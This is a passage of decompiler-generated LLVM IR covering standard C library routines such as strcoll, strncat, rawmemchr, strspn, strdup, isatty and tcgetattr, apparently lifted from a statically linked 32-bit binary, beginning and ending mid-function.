dec_label_pc_804d1cc:                             ; preds = %dec_label_pc_804d1c9.preheader, %dec_label_pc_804d19b, %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge, %dec_label_pc_804d1c7, %dec_label_pc_804d1ba
  %v0_804d1cc = load i32, i32* @ebx, align 4
  %v1_804d1cc = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_804d1cc, %v1_804d1cc
  br i1 %tmp, label %dec_label_pc_804d1d0, label %dec_label_pc_804d1d5

dec_label_pc_804d1d0:                             ; preds = %dec_label_pc_804d1cc
  %v1_804d1d0 = inttoptr i32 %v0_804d1cc to i8*
  store i8 0, i8* %v1_804d1d0, align 1
  %v0_804d1da.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d1d7

dec_label_pc_804d1d5:                             ; preds = %dec_label_pc_804d1cc, %dec_label_pc_804d1ba, %entry
  br label %dec_label_pc_804d1d7

dec_label_pc_804d1d7:                             ; preds = %dec_label_pc_804d1d0, %dec_label_pc_804d1d5
  %v0_804d1da = phi i32 [ %v0_804d1da.pre, %dec_label_pc_804d1d0 ], [ 0, %dec_label_pc_804d1d5 ]
  store i32 %v0_804d1da, i32* %eax.global-to-local, align 4
  store i32 %v0_804d178, i32* @ebp, align 4
  ret i32 %v0_804d1da

; uselistorder directives
  uselistorder i32 %v0_804d1da, { 1, 0 }
  uselistorder i32 %v0_804d1cc, { 1, 0 }
  uselistorder i32 %v1_804d1c9, { 1, 0 }
  uselistorder i32 %v0_804d1ad, { 0, 2, 1 }
  uselistorder i32 %v0_804d193, { 1, 0 }
  uselistorder label %dec_label_pc_804d1d7, { 1, 0 }
  uselistorder label %dec_label_pc_804d1cc, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804d193, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804d1e6 = ptrtoint i8* %arg1 to i32
  %v4_804d1ee.pre = load i32, i32* @eax, align 4
  %v8_804d1ee.pre = load i1, i1* @df, align 1
  %v9_804d1ee = select i1 %v8_804d1ee.pre, i32 -1, i32 1
  br label %dec_label_pc_804d1ee

dec_label_pc_804d1ee:                             ; preds = %dec_label_pc_804d1f2, %entry
  %v20_804d1ef = phi i32 [ %v23_804d1ef, %dec_label_pc_804d1f2 ], [ %arg2, %entry ]
  %v4_804d1ee = phi i32 [ %v6_804d1ee, %dec_label_pc_804d1f2 ], [ %v4_804d1ee.pre, %entry ]
  %v7_804d1ee = phi i32 [ %v10_804d1ee, %dec_label_pc_804d1f2 ], [ %v4_804d1e6, %entry ]
  %v1_804d1ee = inttoptr i32 %v7_804d1ee to i8*
  %v2_804d1ee = load i8, i8* %v1_804d1ee, align 1
  %v3_804d1ef = inttoptr i32 %v20_804d1ef to i8*
  %v4_804d1ef = load i8, i8* %v3_804d1ef, align 1
  %v15_804d1ef = icmp eq i8 %v2_804d1ee, %v4_804d1ef
  %v1_804d1f0 = icmp eq i1 %v15_804d1ef, false
  br i1 %v1_804d1f0, label %dec_label_pc_804d1fa, label %dec_label_pc_804d1f2

dec_label_pc_804d1f2:                             ; preds = %dec_label_pc_804d1ee
  %v3_804d1ee = zext i8 %v2_804d1ee to i32
  %v5_804d1ee = and i32 %v4_804d1ee, -256
  %v6_804d1ee = or i32 %v3_804d1ee, %v5_804d1ee
  %v23_804d1ef = add i32 %v20_804d1ef, %v9_804d1ee
  %v10_804d1ee = add i32 %v7_804d1ee, %v9_804d1ee
  %v4_804d1f2 = icmp eq i8 %v2_804d1ee, 0
  %v1_804d1f4 = icmp eq i1 %v4_804d1f2, false
  br i1 %v1_804d1f4, label %dec_label_pc_804d1ee, label %dec_label_pc_804d1fe

dec_label_pc_804d1fa:                             ; preds = %dec_label_pc_804d1ee
  br label %dec_label_pc_804d1fe

dec_label_pc_804d1fe:                             ; preds = %dec_label_pc_804d1f2, %dec_label_pc_804d1fa
  %storemerge = phi i32 [ 1, %dec_label_pc_804d1fa ], [ 0, %dec_label_pc_804d1f2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804d1ee, { 1, 2, 0 }
  uselistorder i32 %v9_804d1ee, { 1, 0 }
  uselistorder label %dec_label_pc_804d1fe, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d21b = load i32, i32* @esi, align 4
  store i32 %v0_804d21b, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_804d21f = ptrtoint i8* %tmp5 to i32
  store i32 %v4_804d21f, i32* %esi.global-to-local, align 4
  %v4_804d227 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_804d22b = call i32 @_strlen(i8* %v4_804d227)
  %v2_804d22d = add i32 %tmp, -1
  store i32 %v2_804d22d, i32* %edi.global-to-local, align 4
  %v8_804d23110 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d23110, label %dec_label_pc_804d23c, label %dec_label_pc_804d234.lr.ph

dec_label_pc_804d234.lr.ph:                       ; preds = %entry
  %v4_804d234.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_804d234.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d234

dec_label_pc_804d234:                             ; preds = %dec_label_pc_804d234.lr.ph, %dec_label_pc_804d234.dec_label_pc_804d231_crit_edge
  %v8_804d234 = phi i1 [ %v8_804d234.pre, %dec_label_pc_804d234.lr.ph ], [ %v5_804d235, %dec_label_pc_804d234.dec_label_pc_804d231_crit_edge ]
  %v4_804d234 = phi i32 [ %v4_804d234.pre, %dec_label_pc_804d234.lr.ph ], [ %v0_804d236, %dec_label_pc_804d234.dec_label_pc_804d231_crit_edge ]
  %v2_804d23e12 = phi i32 [ %v2_804d22d, %dec_label_pc_804d234.lr.ph ], [ %v7_804d235, %dec_label_pc_804d234.dec_label_pc_804d231_crit_edge ]
  %v0_804d234 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d234 = inttoptr i32 %v0_804d234 to i8*
  %v2_804d234 = load i8, i8* %v1_804d234, align 1
  %v3_804d234 = zext i8 %v2_804d234 to i32
  %v5_804d234 = and i32 %v4_804d234, -256
  %v6_804d234 = or i32 %v5_804d234, %v3_804d234
  store i32 %v6_804d234, i32* %eax.global-to-local, align 4
  %v9_804d234 = select i1 %v8_804d234, i32 -1, i32 1
  %v10_804d234 = add i32 %v9_804d234, %v0_804d234
  store i32 %v10_804d234, i32* %esi.global-to-local, align 4
  %v3_804d235 = inttoptr i32 %v2_804d23e12 to i8*
  store i8 %v2_804d234, i8* %v3_804d235, align 1
  %v4_804d235 = load i32, i32* %edi.global-to-local, align 4
  %v5_804d235 = load i1, i1* @df, align 1
  %v6_804d235 = select i1 %v5_804d235, i32 -1, i32 1
  %v7_804d235 = add i32 %v6_804d235, %v4_804d235
  store i32 %v7_804d235, i32* %edi.global-to-local, align 4
  %v0_804d236 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d236 = trunc i32 %v0_804d236 to i8
  %v4_804d236 = icmp eq i8 %v3_804d236, 0
  %v1_804d238 = icmp eq i1 %v4_804d236, false
  br i1 %v1_804d238, label %dec_label_pc_804d234.dec_label_pc_804d231_crit_edge, label %dec_label_pc_804d23f

dec_label_pc_804d234.dec_label_pc_804d231_crit_edge: ; preds = %dec_label_pc_804d234
  %v0_804d231.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d231 = add i32 %v0_804d231.pre, -1
  %v8_804d231 = icmp eq i32 %v1_804d231, 0
  store i32 %v1_804d231, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d231, label %dec_label_pc_804d23c, label %dec_label_pc_804d234

dec_label_pc_804d23c:                             ; preds = %dec_label_pc_804d234.dec_label_pc_804d231_crit_edge, %entry
  %v2_804d23e.lcssa = phi i32 [ %v2_804d22d, %entry ], [ %v7_804d235, %dec_label_pc_804d234.dec_label_pc_804d231_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804d23e = inttoptr i32 %v2_804d23e.lcssa to i8*
  store i8 0, i8* %v3_804d23e, align 1
  %v4_804d23e = load i32, i32* %edi.global-to-local, align 4
  %v5_804d23e = load i1, i1* @df, align 1
  %v6_804d23e = select i1 %v5_804d23e, i32 -1, i32 1
  %v7_804d23e = add i32 %v6_804d23e, %v4_804d23e
  store i32 %v7_804d23e, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d23f

dec_label_pc_804d23f:                             ; preds = %dec_label_pc_804d234, %dec_label_pc_804d23c
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_804d243 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d243, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_804d231, { 1, 0 }
  uselistorder i32 %v0_804d236, { 1, 0 }
  uselistorder i32 %v7_804d235, { 0, 2, 1 }
  uselistorder i1 %v5_804d235, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804d23f, { 1, 0 }
  uselistorder label %dec_label_pc_804d234, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804d249 = load i32, i32* @ebx, align 4
  %v4_804d24a = urem i32 %arg2, 256
  %v4_804d24e = ptrtoint i8* %arg1 to i32
  %v2_804d2594 = urem i32 %v4_804d24e, 4
  %v3_804d2595 = icmp eq i32 %v2_804d2594, 0
  %v1_804d25b9 = icmp eq i1 %v3_804d2595, false
  %v4_804d254 = trunc i32 %arg2 to i8
  br i1 %v1_804d25b9, label %dec_label_pc_804d254, label %dec_label_pc_804d25d

dec_label_pc_804d254:                             ; preds = %entry, %dec_label_pc_804d258
  %v0_804d258 = phi i32 [ %v1_804d258, %dec_label_pc_804d258 ], [ %v4_804d24e, %entry ]
  %v1_804d254 = inttoptr i32 %v0_804d258 to i8*
  %v2_804d254 = load i8, i8* %v1_804d254, align 1
  %v15_804d254 = icmp eq i8 %v2_804d254, %v4_804d254
  br i1 %v15_804d254, label %dec_label_pc_804d2a8, label %dec_label_pc_804d258

dec_label_pc_804d258:                             ; preds = %dec_label_pc_804d254
  %v1_804d258 = add i32 %v0_804d258, 1
  %v2_804d259 = urem i32 %v1_804d258, 4
  %v3_804d259 = icmp eq i32 %v2_804d259, 0
  %v1_804d25b = icmp eq i1 %v3_804d259, false
  br i1 %v1_804d25b, label %dec_label_pc_804d254, label %dec_label_pc_804d25d

dec_label_pc_804d25d:                             ; preds = %entry, %dec_label_pc_804d258
  %v0_804d260 = phi i32 [ %v1_804d258, %dec_label_pc_804d258 ], [ %v4_804d24e, %entry ]
  %v2_804d264 = mul nuw nsw i32 %v4_804d24a, 256
  %v2_804d267 = or i32 %v2_804d264, %v4_804d24a
  %v2_804d26b = mul i32 %v2_804d267, 65536
  %v2_804d26e = or i32 %v2_804d26b, %v2_804d267
  br label %dec_label_pc_804d270

dec_label_pc_804d270:                             ; preds = %dec_label_pc_804d2a0, %dec_label_pc_804d270, %dec_label_pc_804d25d
  %v0_804d274 = phi i32 [ %v0_804d260, %dec_label_pc_804d25d ], [ %v1_804d274, %dec_label_pc_804d270 ], [ %v1_804d274, %dec_label_pc_804d2a0 ]
  %v2_804d272 = inttoptr i32 %v0_804d274 to i32*
  %v3_804d272 = load i32, i32* %v2_804d272, align 4
  %v4_804d272 = xor i32 %v3_804d272, %v2_804d26e
  %v1_804d274 = add i32 %v0_804d274, 4
  store i32 %v1_804d274, i32* @ecx, align 4
  %v1_804d277 = add i32 %v4_804d272, 2130640639
  %v1_804d27d = sub i32 -1, %v4_804d272
  store i32 %v1_804d27d, i32* @edx, align 4
  %v2_804d27f = xor i32 %v1_804d277, %v1_804d27d
  %v1_804d281 = and i32 %v2_804d27f, -2130640640
  %v2_804d281 = icmp eq i32 %v1_804d281, 0
  br i1 %v2_804d281, label %dec_label_pc_804d270, label %dec_label_pc_804d288

dec_label_pc_804d288:                             ; preds = %dec_label_pc_804d270
  %v2_804d288 = inttoptr i32 %v0_804d274 to i8*
  %v3_804d288 = load i8, i8* %v2_804d288, align 1
  %v16_804d288 = icmp eq i8 %v3_804d288, %v4_804d254
  br i1 %v16_804d288, label %dec_label_pc_804d2a8, label %dec_label_pc_804d290

dec_label_pc_804d290:                             ; preds = %dec_label_pc_804d288
  %v1_804d290 = add i32 %v0_804d274, 1
  %v2_804d290 = inttoptr i32 %v1_804d290 to i8*
  %v3_804d290 = load i8, i8* %v2_804d290, align 1
  %v16_804d290 = icmp eq i8 %v3_804d290, %v4_804d254
  br i1 %v16_804d290, label %dec_label_pc_804d2a8, label %dec_label_pc_804d298

dec_label_pc_804d298:                             ; preds = %dec_label_pc_804d290
  %v1_804d298 = add i32 %v0_804d274, 2
  %v2_804d298 = inttoptr i32 %v1_804d298 to i8*
  %v3_804d298 = load i8, i8* %v2_804d298, align 1
  %v16_804d298 = icmp eq i8 %v3_804d298, %v4_804d254
  br i1 %v16_804d298, label %dec_label_pc_804d2a8, label %dec_label_pc_804d2a0

dec_label_pc_804d2a0:                             ; preds = %dec_label_pc_804d298
  %v1_804d2a0 = add i32 %v0_804d274, 3
  %v2_804d2a0 = inttoptr i32 %v1_804d2a0 to i8*
  %v3_804d2a0 = load i8, i8* %v2_804d2a0, align 1
  %v16_804d2a0 = icmp eq i8 %v3_804d2a0, %v4_804d254
  %v1_804d2a6 = icmp eq i1 %v16_804d2a0, false
  br i1 %v1_804d2a6, label %dec_label_pc_804d270, label %dec_label_pc_804d2a8

dec_label_pc_804d2a8:                             ; preds = %dec_label_pc_804d254, %dec_label_pc_804d2a0, %dec_label_pc_804d298, %dec_label_pc_804d290, %dec_label_pc_804d288
  %v0_804d2aa = phi i32 [ %v1_804d2a0, %dec_label_pc_804d2a0 ], [ %v1_804d298, %dec_label_pc_804d298 ], [ %v1_804d290, %dec_label_pc_804d290 ], [ %v0_804d274, %dec_label_pc_804d288 ], [ %v0_804d258, %dec_label_pc_804d254 ]
  store i32 %v0_804d249, i32* @ebx, align 4
  ret i32 %v0_804d2aa

; uselistorder directives
  uselistorder i32 %v1_804d27d, { 1, 0 }
  uselistorder i32 %v1_804d274, { 2, 1, 0 }
  uselistorder i32 %v2_804d267, { 1, 0 }
  uselistorder i32 %v1_804d258, { 1, 0, 2 }
  uselistorder i8 %v4_804d254, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_804d24e, { 2, 1, 0 }
  uselistorder i32 %v4_804d24a, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804d2a8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804d25d, { 1, 0 }
  uselistorder label %dec_label_pc_804d254, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_804d2ce31 = load i8, i8* %arg1, align 1
  %v4_804d2d035 = icmp eq i8 %v2_804d2ce31, 0
  br i1 %v4_804d2d035, label %dec_label_pc_804d2d8, label %dec_label_pc_804d2d4.lr.ph

dec_label_pc_804d2d4.lr.ph:                       ; preds = %entry
  %v3_804d2ce32 = zext i8 %v2_804d2ce31 to i32
  %v4_804d2ce.pre = load i32, i32* @eax, align 4
  %v5_804d2ce33 = and i32 %v4_804d2ce.pre, -256
  %v6_804d2ce34 = or i32 %v3_804d2ce32, %v5_804d2ce33
  %v4_804d2b5 = ptrtoint i8* %arg1 to i32
  %v1_804d2c018 = inttoptr i32 %arg2 to i8*
  %v4_804d2c0.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804d2d4

dec_label_pc_804d2bb:                             ; preds = %dec_label_pc_804d2d4, %dec_label_pc_804d2bf
  %v6_804d2c028 = phi i32 [ %v6_804d2c0, %dec_label_pc_804d2bf ], [ %v6_804d2c022, %dec_label_pc_804d2d4 ]
  %v2_804d2c027 = phi i8 [ %v2_804d2c0, %dec_label_pc_804d2bf ], [ %v2_804d2c019, %dec_label_pc_804d2d4 ]
  %v0_804d2bf26 = phi i32 [ %v1_804d2bf, %dec_label_pc_804d2bf ], [ %arg2, %dec_label_pc_804d2d4 ]
  %v15_804d2bb = icmp eq i8 %v2_804d2ce39, %v2_804d2c027
  br i1 %v15_804d2bb, label %dec_label_pc_804d2c8, label %dec_label_pc_804d2bf

dec_label_pc_804d2bf:                             ; preds = %dec_label_pc_804d2bb
  %v1_804d2bf = add i32 %v0_804d2bf26, 1
  store i32 %v1_804d2bf, i32* @edx, align 4
  %v1_804d2c0 = inttoptr i32 %v1_804d2bf to i8*
  %v2_804d2c0 = load i8, i8* %v1_804d2c0, align 1
  %v3_804d2c0 = zext i8 %v2_804d2c0 to i32
  %v5_804d2c0 = and i32 %v6_804d2c028, -256
  %v6_804d2c0 = or i32 %v3_804d2c0, %v5_804d2c0
  store i32 %v6_804d2c0, i32* @ecx, align 4
  %v4_804d2c2 = icmp eq i8 %v2_804d2c0, 0
  %v1_804d2c4 = icmp eq i1 %v4_804d2c2, false
  br i1 %v1_804d2c4, label %dec_label_pc_804d2bb, label %dec_label_pc_804d2d8

dec_label_pc_804d2c8:                             ; preds = %dec_label_pc_804d2bb
  %v1_804d2cc = add i32 %v0_804d2d937, 1
  %v1_804d2cd = add i32 %v0_804d2cd38, 1
  %v1_804d2ce = inttoptr i32 %v1_804d2cd to i8*
  %v2_804d2ce = load i8, i8* %v1_804d2ce, align 1
  %v3_804d2ce = zext i8 %v2_804d2ce to i32
  %v5_804d2ce = and i32 %v6_804d2ce40, -256
  %v6_804d2ce = or i32 %v3_804d2ce, %v5_804d2ce
  %v4_804d2d0 = icmp eq i8 %v2_804d2ce, 0
  br i1 %v4_804d2d0, label %dec_label_pc_804d2d8, label %dec_label_pc_804d2d4

dec_label_pc_804d2d4:                             ; preds = %dec_label_pc_804d2d4.lr.ph, %dec_label_pc_804d2c8
  %v4_804d2c0.pre = phi i32 [ %v4_804d2c0.pre.pre, %dec_label_pc_804d2d4.lr.ph ], [ %v6_804d2c028, %dec_label_pc_804d2c8 ]
  %v6_804d2ce40 = phi i32 [ %v6_804d2ce34, %dec_label_pc_804d2d4.lr.ph ], [ %v6_804d2ce, %dec_label_pc_804d2c8 ]
  %v2_804d2ce39 = phi i8 [ %v2_804d2ce31, %dec_label_pc_804d2d4.lr.ph ], [ %v2_804d2ce, %dec_label_pc_804d2c8 ]
  %v0_804d2cd38 = phi i32 [ %v4_804d2b5, %dec_label_pc_804d2d4.lr.ph ], [ %v1_804d2cd, %dec_label_pc_804d2c8 ]
  %v0_804d2d937 = phi i32 [ 0, %dec_label_pc_804d2d4.lr.ph ], [ %v1_804d2cc, %dec_label_pc_804d2c8 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804d2c019 = load i8, i8* %v1_804d2c018, align 1
  %v3_804d2c020 = zext i8 %v2_804d2c019 to i32
  %v5_804d2c021 = and i32 %v4_804d2c0.pre, -256
  %v6_804d2c022 = or i32 %v3_804d2c020, %v5_804d2c021
  store i32 %v6_804d2c022, i32* @ecx, align 4
  %v4_804d2c223 = icmp eq i8 %v2_804d2c019, 0
  %v1_804d2c425 = icmp eq i1 %v4_804d2c223, false
  br i1 %v1_804d2c425, label %dec_label_pc_804d2bb, label %dec_label_pc_804d2d8

dec_label_pc_804d2d8:                             ; preds = %entry, %dec_label_pc_804d2c8, %dec_label_pc_804d2d4, %dec_label_pc_804d2bf
  %v0_804d2d917 = phi i32 [ %v0_804d2d937, %dec_label_pc_804d2bf ], [ %v0_804d2d937, %dec_label_pc_804d2d4 ], [ 0, %entry ], [ %v1_804d2cc, %dec_label_pc_804d2c8 ]
  ret i32 %v0_804d2d917

; uselistorder directives
  uselistorder i32 %v6_804d2c022, { 1, 0 }
  uselistorder i8 %v2_804d2c019, { 1, 2, 0 }
  uselistorder i32 %v1_804d2cd, { 1, 0 }
  uselistorder i32 %v6_804d2c0, { 1, 0 }
  uselistorder i8 %v2_804d2c0, { 1, 2, 0 }
  uselistorder i32 %v1_804d2bf, { 2, 1, 0 }
  uselistorder i8 %v2_804d2ce31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d2d8, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804d2d4, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d2e0 = load i32, i32* @edi, align 4
  %v0_804d2e1 = load i32, i32* @esi, align 4
  %v0_804d2e2 = load i32, i32* @ebx, align 4
  store i32 %v0_804d2e2, i32* %stack_var_-12, align 4
  %v4_804d2e3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d2e3, i32* @edi, align 4
  %v3_804d2eb = call i32 @strlen(i8* %arg1)
  %v1_804d2f0 = add i32 %v3_804d2eb, 1
  store i32 %v1_804d2f0, i32* @esi, align 4
  %v2_804d2f6 = call i32 @malloc(i32 %v1_804d2f0)
  %v1_804d2fe = icmp eq i32 %v2_804d2f6, 0
  store i32 %v2_804d2f6, i32* %ebx.global-to-local, align 4
  br i1 %v1_804d2fe, label %dec_label_pc_804d310, label %dec_label_pc_804d304

dec_label_pc_804d304:                             ; preds = %entry
  %v0_804d305 = load i32, i32* @esi, align 4
  %v0_804d306 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_804d2f6 to i16*
  %v6_804d308 = call i32 @memcpy(i16* %tmp11, i32 %v0_804d306, i32 %v0_804d305)
  %v0_804d310.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d310

dec_label_pc_804d310:                             ; preds = %entry, %dec_label_pc_804d304
  %v0_804d310 = phi i32 [ 0, %entry ], [ %v0_804d310.pre, %dec_label_pc_804d304 ]
  %v2_804d312 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d312, i32* @ebx, align 4
  store i32 %v0_804d2e1, i32* @esi, align 4
  store i32 %v0_804d2e0, i32* @edi, align 4
  ret i32 %v0_804d310

; uselistorder directives
  uselistorder i32 %v2_804d2f6, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 6, 5, 4, 3, 2, 1, 8, 7, 0 }
  uselistorder label %dec_label_pc_804d310, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d324 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d329 = icmp eq i32 %v3_804d324, 0
  %v1_804d32b = zext i1 %v1_804d329 to i32
  ret i32 %v1_804d32b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d338 = load i32, i32* @esi, align 4
  %v0_804d339 = load i32, i32* @ebx, align 4
  store i32 %v0_804d339, i32* %stack_var_-8, align 4
  %v2_804d33d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d33d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d34f = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804d33d)
  store i32 %v3_804d34f, i32* %eax.global-to-local, align 4
  %v1_804d357 = icmp eq i32 %v3_804d34f, 0
  store i32 %v3_804d34f, i32* @esi, align 4
  %v1_804d35b = icmp eq i1 %v1_804d357, false
  br i1 %v1_804d35b, label %dec_label_pc_804d3a0, label %dec_label_pc_804d35d

dec_label_pc_804d35d:                             ; preds = %entry
  %v3_804d35d = load i32, i32* %stack_var_-44, align 4
  %v1_804d361 = load i32, i32* @ebx, align 4
  %v2_804d361 = inttoptr i32 %v1_804d361 to i32*
  store i32 %v3_804d35d, i32* %v2_804d361, align 4
  %v1_804d367 = load i32, i32* @ebx, align 4
  %v2_804d367 = add i32 %v1_804d367, 4
  %v3_804d367 = inttoptr i32 %v2_804d367 to i32*
  %v1_804d36e = load i32, i32* @ebx, align 4
  %v2_804d36e = add i32 %v1_804d36e, 8
  %v3_804d36e = inttoptr i32 %v2_804d36e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d375 = load i32, i32* @ebx, align 4
  %v2_804d375 = add i32 %v1_804d375, 12
  %v3_804d375 = inttoptr i32 %v2_804d375 to i32*
  store i32 %tmp3, i32* %v3_804d375, align 4
  %v4_804d378 = zext i8 %tmp to i32
  %v5_804d378 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d378 = and i32 %v5_804d378, -256
  %v7_804d378 = or i32 %v6_804d378, %v4_804d378
  store i32 %v7_804d378, i32* %eax.global-to-local, align 4
  %v2_804d37c = load i32, i32* @ebx, align 4
  %v3_804d37c = add i32 %v2_804d37c, 16
  %v4_804d37c = inttoptr i32 %v3_804d37c to i8*
  store i8 %tmp, i8* %v4_804d37c, align 1
  %v0_804d37f = load i32, i32* %eax.global-to-local, align 4
  %v2_804d382 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d387 = load i32, i32* @ebx, align 4
  %v1_804d387 = add i32 %v0_804d387, 17
  store i32 %v1_804d387, i32* %eax.global-to-local, align 4
  %v4_804d38b = call i32 @__GI_mempcpy(i32 %v1_804d387, i32 %v2_804d382, i32 19, i32 %v0_804d37f)
  store i32 %v4_804d38b, i32* %eax.global-to-local, align 4
  %v3_804d398 = inttoptr i32 %v4_804d38b to i8*
  %v4_804d398 = call i32 @__GI_memset(i8* %v3_804d398, i32 0, i32 13)
  store i32 %v4_804d398, i32* %eax.global-to-local, align 4
  %v0_804d3a3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d3a0

dec_label_pc_804d3a0:                             ; preds = %entry, %dec_label_pc_804d35d
  %v0_804d3a3 = phi i32 [ %v3_804d34f, %entry ], [ %v0_804d3a3.pre, %dec_label_pc_804d35d ]
  store i32 %v0_804d3a3, i32* %eax.global-to-local, align 4
  %v2_804d3a5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d3a5, i32* @ebx, align 4
  store i32 %v0_804d338, i32* @esi, align 4
  ret i32 %v0_804d3a3

; uselistorder directives
  uselistorder i32 %v0_804d3a3, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804d3a0, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_804d3ae = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804d3b1 = load i32, i32* @ebx, align 4
  store i32 %v0_804d3b1, i32* %stack_var_-16, align 4
  %v0_804d3b2 = load i32, i32* @eax, align 4
  store i32 %v0_804d3b2, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_804d3b4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804d3b7 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d3b7, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d3ff15 = inttoptr i32 %v0_804d3b2 to i8*
  %v2_804d3ff16 = load i8, i8* %v1_804d3ff15, align 1
  %v3_804d3ff17 = sext i8 %v2_804d3ff16 to i32
  store i32 %v3_804d3ff17, i32* @ecx, align 4
  %v1_804d40218 = add i32 %v0_804d3b2, 1
  store i32 %v1_804d40218, i32* %ebx.global-to-local, align 4
  %v1_804d40319 = icmp eq i8 %v2_804d3ff16, 0
  store i1 %v1_804d40319, i1* %zf.global-to-local, align 1
  %v1_804d40521 = icmp eq i1 %v1_804d40319, false
  br i1 %v1_804d40521, label %dec_label_pc_804d3c2, label %dec_label_pc_804d407

dec_label_pc_804d3c2:                             ; preds = %entry, %dec_label_pc_804d3ff.backedge
  %v3_804d3ff23 = phi i32 [ %v3_804d3ff, %dec_label_pc_804d3ff.backedge ], [ %v3_804d3ff17, %entry ]
  %v2_804d3ff22 = phi i8 [ %v2_804d3ff, %dec_label_pc_804d3ff.backedge ], [ %v2_804d3ff16, %entry ]
  %v1_804d3c2 = add nsw i32 %v3_804d3ff23, -48
  store i32 %v1_804d3c2, i32* @eax, align 4
